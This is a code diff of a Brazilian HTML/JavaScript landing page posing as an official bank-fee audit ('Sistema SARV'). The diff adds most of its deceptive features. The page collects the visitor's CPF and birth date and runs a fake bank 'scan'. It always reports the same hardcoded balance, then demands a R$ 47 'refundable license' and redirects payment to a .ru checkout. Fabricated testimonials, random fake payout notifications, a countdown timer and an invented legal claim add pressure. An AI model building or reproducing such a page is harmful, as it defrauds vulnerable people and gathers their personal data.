@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Sistema SARV - Auditoria Oficial</title>
     
-    <!-- Scripts e Fontes -->
+    <!-- Scripts e Fontes Originais -->
     <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -37,7 +37,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { background-color: var(--bg); color: var(--text); overflow-x: hidden; font-size: 16px; }
 
-        /* Tela de Transição */
+        /* Estilo da Tela de Transição */
         #loader-redirect {
             display: none;
             position: fixed;
@@ -72,7 +72,7 @@
             text-transform: uppercase;
         }
 
-        /* Estilos da Página */
+        /* Estilos Originais */
         .top-alert { background: #f59e0b; color: #000; padding: 12px; text-align: center; font-size: 12px; font-weight: 800; text-transform: uppercase; z-index: 999; position: relative; border-bottom: 1px solid #d97706; }
         .navbar { background: var(--primary); padding: 15px; border-bottom: 2px solid #003070; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         .logo-container { display: flex; flex-direction: column; color: #fff; }
@@ -136,7 +136,7 @@
 </head>
 <body>
 
-    <!-- Tela de Transição -->
+    <!-- HTML da Tela de Transição -->
     <div id="loader-redirect">
         <div class="spinner-red"></div>
         <div class="loader-text-red">
@@ -157,7 +157,6 @@
 
     <div class="container">
 
-        <!-- PASSO 1: INICIAL -->
         <div id="step-1">
             <section class="hero">
                 <p style="font-size: 14px; font-weight: 800; color: #999;">Por: Roberto Menezes — Ex-Auditor Sênior</p>
@@ -189,6 +188,10 @@
                 </div>
                 
                 <button class="btn-main" onclick="startScanner()">REVELAR MEU SALDO DISPONÍVEL</button>
+                
+                <p style="font-size: 12px; font-weight: 700; color: #666; text-align: center; margin-top: 15px;">
+                    * Atenção: Os valores variam conforme o histórico de cada CPF.
+                </p>
             </div>
 
             <div class="stats-grid">
@@ -208,64 +211,128 @@
                 <div class="card-depo">
                     <div class="depo-header"><b>Antônio Ferreira da Silva Neto</b> <span>13/05/2026</span></div>
                     <div class="val-rec">+R$ 2.810,89</div>
-                    <p class="depo-text">"Trabalhei 40 anos de carteira assinada. A ferramenta achou mais de 2 mil reais que tava parado. Caiu no meu pix na hora."</p>
+                    <p class="depo-text">"Trabalhei 40 anos de carteira assinada. A ferramente achou mais de 2 mil reais que tava parado. Caiu no meu pix na hora como prometido. Parabéns"</p>
                 </div>
             </div>
 
             <button class="btn-more" id="btn-load-more" onclick="loadMoreDepos()">Ver mais depoimentos</button>
+
+            <div class="steps">
+                <div class="depo-title" style="border:none; padding:0;">Como funciona — passo a passo:</div>
+                <div class="step-item">
+                    <div class="step-num">1</div>
+                    <div class="step-info"><b>Consulta Gratuita</b><p>Nosso scanner varre 14 instituições bancárias em tempo real usando seu CPF.</p></div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">2</div>
+                    <div class="step-info"><b>Cálculo de Tarifas</b><p>Localizamos cobranças indevidas e juros acumulados em contas ativas ou inativas.</p></div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">3</div>
+                    <div class="step-info"><b>Saque Imediato</b><p>Configure sua chave PIX para que o sistema realize o depósito automático do valor recuperado diretamente na sua conta bancária.</p></div>
+                </div>
+                <button class="btn-main" style="margin-top:20px;" onclick="document.getElementById('main-form').scrollIntoView({behavior: 'smooth'})">REVELAR MEU SALDO DISPONÍVEL</button>
+            </div>
         </div>
 
-        <!-- PASSO 2: SCANNER -->
         <div id="step-2" style="display: none;">
             <div class="form-card" style="text-align: center;">
                 <div class="loader-circle"></div>
                 <h3 style="font-size: 20px;">🔎 Consultando seu CPF...</h3>
+                <p style="font-size: 14px; margin-bottom: 20px;">Aguarde, estamos processando os dados</p>
+                
                 <div style="text-align: left; background: #fafafa; border-radius: 12px; padding: 15px; border: 1px solid #eee;">
                     <p style="font-size: 12px; font-weight: 800; color: var(--primary); margin-bottom: 10px;">Verificando 14 bancos vinculados ao CPF: <span id="u-cpf"></span></p>
                     <div id="b-list">
-                        <div class="bank-item" data-time="1100"><span>Banco do Brasil</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="900"><span>Caixa Econômica</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="1200"><span>Bradesco</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="800"><span>Nubank</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="2900"><span>Banco do Brasil</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="1100"><span>Caixa Econômica</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="1700"><span>Bradesco</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="1400"><span>Itaú Unibanco</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="3000"><span>Santander</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="1200"><span>Nubank</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="900"><span>Banco Inter</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="650"><span>Mercado Pago</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="750"><span>BTG Pactual</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="800"><span>Banco Safra</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="700"><span>C6 Bank</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="1500"><span>PagBank</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="900"><span>PicPay</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="800"><span>Banco Neon</span> <small>aguardando</small></div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- PASSO 3: RESULTADO -->
         <div id="step-3" style="display: none;">
             <div class="form-card">
-                <div style="background: #dcfce7; color: #166534; padding: 12px; border-radius: 10px; font-weight: 900; text-align: center; margin-bottom: 20px;">
+                <div style="background: #dcfce7; color: #166534; padding: 12px; border-radius: 10px; font-weight: 900; text-align: center; font-size: 15px; margin-bottom: 20px;">
                     ✅ Consulta Concluída — Valor Localizado!
                 </div>
                 
+                <p style="text-align: center; font-size: 17px; margin-bottom: 20px;">
+                    Encontramos valores disponíveis no seu CPF:<br>
+                    <b style="font-size: 13px; color: #777;" id="f-cpf"></b>
+                </p>
+
                 <div class="result-card">
-                    <span style="font-size: 13px; font-weight: 800; color: var(--secondary);">Saldo total disponível</span>
+                    <span style="font-size: 13px; font-weight: 800; color: var(--secondary); text-transform: uppercase;">Saldo total disponível</span>
                     <h3 id="f-money">R$ 2.134,43</h3>
                 </div>
 
                 <div class="audit-details">
-                    <div class="audit-line"><span>Status do Saque:</span> <b class="status-badge">LIBERADO</b></div>
-                    <p class="liquidation-notice">📌 Para liberar o saque imediato de <b class="f-money-txt">R$ 2.134,43</b>, você precisa ativar sua licença de validação abaixo.</p>
+                    <div class="audit-line"><span>Instituições Consultadas:</span> <b>14 Bancos</b></div>
+                    <div class="audit-line"><span>Tarifas Bancárias Indevidas Localizadas:</span> <b>R$ 1.280,66</b></div>
+                    <div class="audit-line"><span>Cesta de Serviços Anual:</span> <b>R$ 853,77</b></div>
+                    <div class="audit-line" style="margin-top:10px; padding-top:15px; border-top: 1px solid #cbd5e1;">
+                        <span>Status do Saque:</span> <b class="status-badge">LIBERADO</b>
+                    </div>
+                    <p class="liquidation-notice">
+                        📌 <b>Liberação Autorizada:</b> Os valores que localizamos aparecem após uma varredura completa nos registros bancários. Pela lei de ativos retidos, os bancos não podem segurar esse saldo.
+                    </p>
                 </div>
 
                 <div class="pix-container">
+                    <label>Selecione seu banco:</label>
+                    <select id="banco-select" style="margin-bottom: 10px;">
+                        <option value="">Escolher instituição...</option>
+                        <option>Nubank</option><option>Inter</option><option>C6 Bank</option><option>PagBank</option><option>PicPay</option><option>Mercado Pago</option><option>Itaú</option><option>Bradesco</option><option>Santander</option><option>Caixa</option><option>Banco do Brasil</option>
+                    </select>
                     <label>Sua Chave PIX:</label>
                     <input type="text" placeholder="CPF, E-mail ou Celular...">
                 </div>
 
-                <div style="background: #fff; border: 2px solid var(--secondary); border-radius: 15px; padding: 20px; text-align: center; margin: 20px 0;">
-                    <span style="font-size: 14px; color: #999; text-decoration: line-through;">De R$ 197,00</span>
-                    <div style="font-size: 46px; font-weight: 900; color: var(--secondary);">R$ 47,00</div>
-                    <p style="font-size: 12px; font-weight: 700; color: #666;">Valor 100% reembolsável no ato do saque</p>
+                <h3 style="color: #ff0000; font-size: 20px; font-weight: 900; text-align: center; margin: 25px 0 15px;">⚠️ ÚLTIMA ETAPA: ATIVAÇÃO DA LICENÇA</h3>
+                
+                <div style="font-size: 16px; line-height: 1.6; color: #333; margin-bottom: 20px; text-align: center; background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px;">
+                    Para garantir a segurança do titular e evitar fraudes, é necessário ativar sua <b>Licença de Validação de Saque</b>.<br><br>
+                    <b>IMPORTANTE:</b> O valor da licença de R$ 47,00 é 100% REEMBOLSÁVEL e será devolvido automaticamente somado ao seu saque total de <b class="f-money-txt">R$ 2.134,43</b>.
                 </div>
 
-                <button onclick="finalizarSaque()" class="btn-main">ATIVAR MINHA LICENÇA</button>
+                <div style="background: #fff; border: 2px solid var(--secondary); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 25px;">
+                    <span style="font-size: 14px; color: #999; text-decoration: line-through;">De R$ 197,00</span>
+                    <div style="font-size: 46px; font-weight: 900; color: var(--secondary);">R$ 47,00</div>
+                    <div style="display:flex; justify-content: space-around; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee;">
+                        <div><span style="display:block; font-size: 13px; color: #999; font-weight:800;">Encerra em</span><b style="color:#ff0000; font-size: 20px;" id="timer">05:00</b></div>
+                        <div><span style="display:block; font-size: 13px; color: #999; font-weight:800;">Saque no CPF</span><b style="font-size: 20px;">DISPONÍVEL (1)</b></div>
+                    </div>
+                </div>
+
+                <!-- Botão com Redirecionamento -->
+                <button onclick="finalizarSaque()"
+                   class="btn-main" 
+                   style="text-decoration: none; display: block; text-align: center; font-size: 20px;">ATIVAR MINHA LICENÇA</button>
+
+                <div class="roberto-box" style="margin-top: 25px; background: #fdfdfd; border-color: var(--danger);">
+                     <p style="font-size: 15px; color: #111; line-height: 1.6; font-weight: 600;">
+                        <b>Roberto Menezes:</b> "Ative sua licença agora, receba seus <b class="f-money-txt">R$ 2.134,43</b> e tenha os 47 reais devolvidos no mesmo PIX. Não deixe o banco ficar com o que é seu por direito."
+                    </p>
+                </div>
             </div>
         </div>
 
         <footer class="footer">
             Sistema SARV — Painel de Verificação Financeira<br>
+            Ambiente protegido • Consulta criptografada<br>
             © 2026 SARV Sistema de Auditoria
         </footer>
     </div>
@@ -279,7 +346,7 @@
     </div>
 
     <script>
-        // REDIRECIONAMENTO COM O LINK .RU
+        // Função de Redirecionamento com Carregamento e Link Novo
         function finalizarSaque() {
             if(typeof fbq === 'function') {
                 fbq('track', 'InitiateCheckout');
@@ -287,59 +354,105 @@
 
             document.getElementById('loader-redirect').style.display = 'flex';
 
-            // O LINK .RU ATUALIZADO
-            const linkCheckout = "https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O";
-
             setTimeout(function() {
-                window.location.href = linkCheckout;
+                // Link atualizado conforme solicitado
+                window.location.href = "https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O";
             }, 2500);
         }
 
-        // Mascaras
+        // Mascara CPF
         document.getElementById('cpf').addEventListener('input', e => {
-            let v = e.target.value.replace(/\D/g, '').slice(0, 11);
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length > 11) v = v.slice(0, 11);
             e.target.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
         });
 
+        // Mascara Data de Nascimento
         document.getElementById('nascimento').addEventListener('input', e => {
-            let v = e.target.value.replace(/\D/g, '').slice(0, 8);
-            if (v.length >= 5) v = v.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3");
-            else if (v.length >= 3) v = v.replace(/(\d{2})(\d{2})/, "$1/$2");
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length > 8) v = v.slice(0, 8);
+            if (v.length >= 5) {
+                v = v.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3");
+            } else if (v.length >= 3) {
+                v = v.replace(/(\d{2})(\d{2})/, "$1/$2");
+            }
             e.target.value = v;
         });
 
-        async function startScanner() {
-            if(document.getElementById('cpf').value.length < 14) return alert("CPF Inválido");
-            document.getElementById('step-1').style.display = 'none';
-            document.getElementById('step-2').style.display = 'block';
-            document.getElementById('u-cpf').innerText = document.getElementById('cpf').value;
-            
-            const bItems = document.querySelectorAll('.bank-item');
-            for (let item of bItems) {
-                item.querySelector('small').innerText = "⟳ Buscando...";
-                await new Promise(r => setTimeout(r, item.getAttribute('data-time')));
-                item.querySelector('small').innerText = "✓ Verificado";
-                item.querySelector('small').className = "status-ok";
-            }
-            setTimeout(() => {
-                document.getElementById('step-2').style.display = 'none';
-                document.getElementById('step-3').style.display = 'block';
-            }, 500);
+        const usersPop = [
+            {n: "Bruno Moura de Souza"}, {n: "Carla Vargas Mendonça"},
+            {n: "Rodrigo Alves Cavalcante"}, {n: "Juliana Costa Ferreira da Silva"},
+            {n: "Felipe Guedes de Oliveira"}, {n: "Patrícia Lima dos Santos"},
+            {n: "Daniel Souza de Albuquerque"}, {n: "Aline Pereira Guimarães"}
+        ];
+        
+        function showNotification() {
+            const user = usersPop[Math.floor(Math.random() * usersPop.length)];
+            const val = (Math.random() * (2890 - 1100) + 1100).toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            document.getElementById('notif-name').innerText = `${user.n}`;
+            document.getElementById('notif-money').innerText = `R$ ${val} via PIX`;
+            const box = document.getElementById('notification-box');
+            box.classList.add('show');
+            setTimeout(() => box.classList.remove('show'), 6000);
         }
+        setInterval(showNotification, 12000);
 
         function loadMoreDepos() {
-            alert("Carregando mais depoimentos...");
+            const container = document.getElementById('depo-container');
+            const hoje = "13/05/2026";
+            const novos = [
+                {n: "Sandra Regina Santos Silva", l: hoje, v: "1.650,10", t: "Fiz a consulta e o valor do Santander que está inativo apareceu. Fiz o saque e caiu tudo certinho na minha conta."},
+                {n: "Luiz Gustavo Moreira Ramos", l: hoje, v: "1.120,45", t: "Estava precisando muito desse dinheiro pois meu aluguel estava atrasado. O sistema é muito rápido."},
+                {n: "Marcos Vinícius de Oliveira", l: hoje, v: "2.270,80", t: "Vi no anúncio e achei que era brincadeira, mas realmente tinha um valor de uma conta antiga minhaa do Itaú."}
+            ];
+            novos.forEach(d => {
+                const div = document.createElement('div');
+                div.className = 'card-depo';
+                div.innerHTML = `<div class="depo-header"><b>${d.n}</b> <span>${d.l}</span></div><div class="val-rec">+R$ ${d.v}</div><p class="depo-text">"${d.t}"</p>`;
+                container.appendChild(div);
+            });
             document.getElementById('btn-load-more').style.display = 'none';
         }
 
-        setInterval(() => {
-            const names = ["Marcos", "Rita", "João", "Sandra"];
-            const val = (Math.random() * 1000 + 1000).toFixed(2);
-            document.getElementById('notif-name').innerText = names[Math.floor(Math.random()*names.length)];
-            document.getElementById('notif-money').innerText = `R$ ${val}`;
-            document.getElementById('notification-box').classList.add('show');
-            setTimeout(() => document.getElementById('notification-box').classList.remove('show'), 5000);
-        }, 12000);
+        async function startScanner() {
+            const cpf = document.getElementById('cpf').value;
+            const nasc = document.getElementById('nascimento').value;
+            if(cpf.length < 14 || nasc.length < 10) { alert("Preencha os dados corretamente!"); return; }
+            
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'block';
+            document.getElementById('u-cpf').innerText = cpf;
+            
+            const bItems = document.querySelectorAll('.bank-item');
+            for (let i = 0; i < bItems.length; i++) {
+                const item = bItems[i];
+                const delay = parseInt(item.getAttribute('data-time'));
+                item.querySelector('small').innerText = "⟳ Buscando...";
+                item.querySelector('small').className = "status-load";
+                await new Promise(r => setTimeout(r, delay));
+                item.querySelector('small').innerText = "✓ Verificado";
+                item.querySelector('small').className = "status-ok";
+            }
+            setTimeout(showResult, 800);
+        }
+
+        function showResult() {
+            const fixo = "R$ 2.134,43";
+            document.getElementById('f-money').innerText = fixo;
+            document.querySelectorAll('.f-money-txt').forEach(el => el.innerText = fixo);
+            document.getElementById('f-cpf').innerText = "CPF: " + document.getElementById('cpf').value;
+            
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-3').style.display = 'block';
+            window.scrollTo(0,0);
+            
+            let dur = 300;
+            setInterval(() => {
+                let m = Math.floor(dur/60); let s = dur%60;
+                document.getElementById('timer').innerText = `0${m}:${s < 10 ? '0'+s : s}`;
+                if(--dur < 0) dur = 0;
+            }, 1000);
+        }
     </script>
 </body>
 </html>
